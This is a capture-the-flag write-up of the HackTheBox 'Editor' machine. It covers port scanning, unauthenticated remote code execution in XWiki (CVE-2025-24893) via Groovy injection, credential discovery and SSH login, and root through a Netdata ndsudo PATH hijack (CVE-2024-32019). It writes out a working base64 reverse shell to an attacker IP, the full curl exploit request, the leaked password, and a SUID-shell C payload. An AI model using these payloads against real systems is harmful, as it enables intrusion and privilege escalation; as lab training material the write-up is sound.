---
title: Editor
draft: false
tags:
  - Path-Hijacking
  - Unauthenticated-RCE
  - SUID-Exploitation
passwordHash: d2d49cd8bc03605bed79d4a8565f063972f0ae19b739644e8b405dca09e01928
socialImage: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ba9dec0d022d3c3b6a96aa5dba4772c7.png
socialDescription: The "Editor" machine on HackTheBox is an easy Linux challenge focused on exploiting an unauthenticated remote code execution vulnerability in the XWiki application. It involves web enumeration, lateral movement via SSH, and privilege escalation through a SUID binary exploit.
---
![[../../../assets/Editor.png]]
Machine: https://app.hackthebox.com/machines/Editor

----
# Information gathering
## Port scanning
- As always lets start with [[../../../Tools/Activas/3. Escaneo de puertos/nmap|nmap]]:
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.80
nmap -p22,80,8080 -sCV -n -Pn --min-rate 5000 10.10.11.80
```
![[../../../assets/Pasted image 20250904065532.png]]
	- seems like there are a web page, named "editor.htb", and some software versions, Also there are and other http server at port 8080.

## Web enumeration (80)
- We can use [[../../../Tools/Pasivas/Obtencion de informacion/1. Reconocimiento web/whatweb|whatweb]] and [[../../../Tools/wappanalyzer|wappanalyzer]] in order to get more info about the used tecnologies
```bash
whatweb -a 3 http://editor.htb/
```
>[!example]- show
![[../../../assets/Pasted image 20250904071021.png]]
![[../../../assets/Pasted image 20250904070747.png]]

	We got some interesting software versions (we can look for some know vulns)
- Manual enumeration:
	- there are a wiki page version `xWiki 15.1.8`
	- We can download a .deb or .exe file
	- Valid Email:
		- `contact@editor.htb`

## Web enumeration (8080)
- After enumerate this service, i notice that we have some interesting stuff into `http://wiki.editor.htb:8080/robots.txt`

- looking for vulns i found that this endpoint has RCE `/xwiki/bin/get/Main/SolrSearch?media=rss&text=` seems like we can inject Groovy code into this field  `text` and then the server evaluate it, so we can use a payload like this to exploit it:
```groovy
}}}{{async async=false}}{{groovy}}'id'.execute(){{/groovy}}{{/async}}
```

# Web Exploitation
- Like we saw lets exploit the vuln `CVE-2025-24893` with this peace of code, with a embed a base64 ReverShell:
>[!warning] Care
>If get a base64 result with a `+` symbol, we need to change the payload to other one without this symbol, in my case i couldnt use `bash -i` so i used `sh -i`
>![[../../../assets/Pasted image 20250904095435.png]]

```bash
echo -n "sh -i >& /dev/tcp/10.10.14.12/4444 0>&1" | base64 -w 0
```

![[../../../assets/Pasted image 20250904095458.png]]

- now all together
>[!note]- Note
>We hace to tools like [[../../../Tools/cyberChef|cyberChef]] to convert the string to URLencoded
>![[../../../assets/Pasted image 20250904101355.png]]


```bash
curl "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D'bash%20-c%20%7Becho,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvNDQ0NCAwPiYx%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-%7D'.execute()%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D"
```

- Finally we can enhance our terminal using this method [[../../../private/trucos/Tratamiento de la tty|Tratamiento de la tty]]


# Linux Enumeration (xwiki)
- There is a interesting user named "oliver"
```bash
whoami && cat /etc/passwd | grep -E "sh$"
```
![[../../../assets/Pasted image 20250904102504.png]]

- After a while i remembered that `xwiki` was running, so i searched the location of this project
>[!note]- Tip
>I recomment use `-L` with `find` command becouse allow us to folow symbolic links (that is the case)

```bash
find -L . -type f ! -name "*.jar" ! -name "*.xed" ! -name "*.vm" -exec grep -iI "password" {} +
```
>[!example]- Show
>![[../../../assets/Pasted image 20250905092946.png]]

# Lateral Movement (xwiki -> oliver )
- we cant pivot to this user using `su` command but if we use SSH service we can login
```bash
ssh oliver@10.10.11.80
```
Creds: `oliver:theEd1t0rTeam99`
>[!example]- Show
>![[../../../assets/Pasted image 20250905093645.png]]

# Linux Enumeration (oliver)

- After a while i found a interesting port `19999`:
```bash
netstat -nat
```
>[!example]- Show
>![[../../../assets/Pasted image 20250905093902.png]]

- so lets check the headers:
```bash
nc -nv 127.0.0.1 19999
```
>[!example]- Show
>![[../../../assets/Pasted image 20250904121718.png]]

- There are a http server running "Netdata Embedded HTTP Server v1.45.2", this version allow us to perform privilege escalation

# Privilege escalation (oliver -> root)

- Lets exploit this vuln "CVE-2024-32019" first we need to locate `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo` (that has SUID) and we can execute it:

```bash
ll /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```
>[!example]- Show
>![[../../../assets/Pasted image 20250905094117.png]]

- This vuln exploit a path traversal vector, when using `arcconf-ld-info` function, as NETDATA is developed on C we need to create a payload named "arcconf.c".
```C
#include <unistd.h>
//execute a new program inside the current one
int main() {
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
```

- Then Compile it using `gcc` 
```bash
gcc arcconf.c -o arcconf
```
>[!example]- Show
>![[../../../assets/Pasted image 20250905095214.png]]

- now we have to transfer and change the path to add the folder with this file
```bash
mkdir myFolder
mv arcconf myFolder/
chmod +x myFolder/arcconf
export PATH=/home/oliver/myFolder:$PATH
```

- Finally run the command
```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-ld-info
```
>[!example]- Show
>![[../../../assets/Pasted image 20250905105009.png]]

